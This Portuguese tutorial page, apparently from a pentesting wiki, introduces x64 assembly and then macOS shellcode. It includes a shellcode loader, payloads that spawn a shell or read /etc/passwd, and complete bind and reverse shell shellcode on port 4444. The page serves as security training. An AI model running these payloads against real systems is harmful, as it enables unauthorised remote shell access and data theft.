# Introdução ao x64

{{#include ../../../banners/hacktricks-training.md}}

## **Introdução ao x64**

x64, também conhecido como x86-64, é uma arquitetura de processador de 64 bits predominantemente utilizada em computação de desktop e servidores. Originada da arquitetura x86 produzida pela Intel e posteriormente adotada pela AMD com o nome AMD64, é a arquitetura prevalente em computadores pessoais e servidores hoje.

### **Registradores**

x64 expande a arquitetura x86, apresentando **16 registradores de uso geral** rotulados como `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, e `r8` a `r15`. Cada um deles pode armazenar um valor **de 64 bits** (8 bytes). Esses registradores também possuem sub-registradores de 32 bits, 16 bits e 8 bits para compatibilidade e tarefas específicas.

1. **`rax`** - Tradicionalmente usado para **valores de retorno** de funções.
2. **`rbx`** - Frequentemente usado como um **registrador base** para operações de memória.
3. **`rcx`** - Comumente usado para **contadores de loop**.
4. **`rdx`** - Usado em várias funções, incluindo operações aritméticas estendidas.
5. **`rbp`** - **Ponteiro base** para o quadro de pilha.
6. **`rsp`** - **Ponteiro de pilha**, mantendo o controle do topo da pilha.
7. **`rsi`** e **`rdi`** - Usados para índices de **origem** e **destino** em operações de string/memória.
8. **`r8`** a **`r15`** - Registradores adicionais de uso geral introduzidos no x64.

### **Convenção de Chamada**

A convenção de chamada x64 varia entre sistemas operacionais. Por exemplo:

- **Windows**: Os primeiros **quatro parâmetros** são passados nos registradores **`rcx`**, **`rdx`**, **`r8`** e **`r9`**. Parâmetros adicionais são empurrados para a pilha. O valor de retorno está em **`rax`**.
- **System V (comumente usado em sistemas semelhantes ao UNIX)**: Os primeiros **seis parâmetros inteiros ou ponteiros** são passados nos registradores **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** e **`r9`**. O valor de retorno também está em **`rax`**.

Se a função tiver mais de seis entradas, o **restante será passado na pilha**. **RSP**, o ponteiro de pilha, deve estar **alinhado a 16 bytes**, o que significa que o endereço para o qual aponta deve ser divisível por 16 antes de qualquer chamada ocorrer. Isso significa que normalmente precisaríamos garantir que RSP esteja devidamente alinhado em nosso shellcode antes de fazermos uma chamada de função. No entanto, na prática, chamadas de sistema funcionam muitas vezes mesmo que esse requisito não seja atendido.

### Convenção de Chamada em Swift

Swift tem sua própria **convenção de chamada** que pode ser encontrada em [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Instruções Comuns**

As instruções x64 possuem um conjunto rico, mantendo compatibilidade com instruções x86 anteriores e introduzindo novas.

- **`mov`**: **Mover** um valor de um **registrador** ou **local de memória** para outro.
- Exemplo: `mov rax, rbx` — Move o valor de `rbx` para `rax`.
- **`push`** e **`pop`**: Empurrar ou retirar valores da **pilha**.
- Exemplo: `push rax` — Empurra o valor em `rax` para a pilha.
- Exemplo: `pop rax` — Retira o valor do topo da pilha para `rax`.
- **`add`** e **`sub`**: Operações de **adição** e **subtração**.
- Exemplo: `add rax, rcx` — Adiciona os valores em `rax` e `rcx`, armazenando o resultado em `rax`.
- **`mul`** e **`div`**: Operações de **multiplicação** e **divisão**. Nota: essas têm comportamentos específicos em relação ao uso de operandos.
- **`call`** e **`ret`**: Usados para **chamar** e **retornar de funções**.
- **`int`**: Usado para acionar uma **interrupção** de software. Ex.: `int 0x80` era usado para chamadas de sistema no Linux x86 de 32 bits.
- **`cmp`**: **Comparar** dois valores e definir as flags da CPU com base no resultado.
- Exemplo: `cmp rax, rdx` — Compara `rax` com `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Instruções de **salto condicional** que alteram o fluxo de controle com base nos resultados de um `cmp` ou teste anterior.
- Exemplo: Após uma instrução `cmp rax, rdx`, `je label` — Salta para `label` se `rax` for igual a `rdx`.
- **`syscall`**: Usado para **chamadas de sistema** em alguns sistemas x64 (como Unix modernos).
- **`sysenter`**: Uma instrução de **chamada de sistema** otimizada em algumas plataformas.

### **Prólogo da Função**

1. **Empurre o antigo ponteiro base**: `push rbp` (salva o ponteiro base do chamador)
2. **Mova o ponteiro de pilha atual para o ponteiro base**: `mov rbp, rsp` (configura o novo ponteiro base para a função atual)
3. **Alocar espaço na pilha para variáveis locais**: `sub rsp, <size>` (onde `<size>` é o número de bytes necessários)

### **Epílogo da Função**

1. **Mova o ponteiro base atual para o ponteiro de pilha**: `mov rsp, rbp` (desaloca variáveis locais)
2. **Retire o antigo ponteiro base da pilha**: `pop rbp` (restaura o ponteiro base do chamador)
3. **Retornar**: `ret` (retorna o controle para o chamador)

## macOS

### syscalls

Existem diferentes classes de syscalls, você pode [**encontrá-las aqui**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Então, você pode encontrar cada número de syscall [**neste url**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Para chamar a syscall `open` (**5**) da **classe Unix/BSD**, você precisa adicioná-la: `0x2000000`

Assim, o número da syscall para chamar open seria `0x2000005`

### Shellcodes

Para compilar:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>C código para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado de [**aqui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e explicado.

{{#tabs}}
{{#tab name="com adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="com pilha"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha dos endereços).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Invocar comando com sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell de [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **porta 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell de [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell para **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
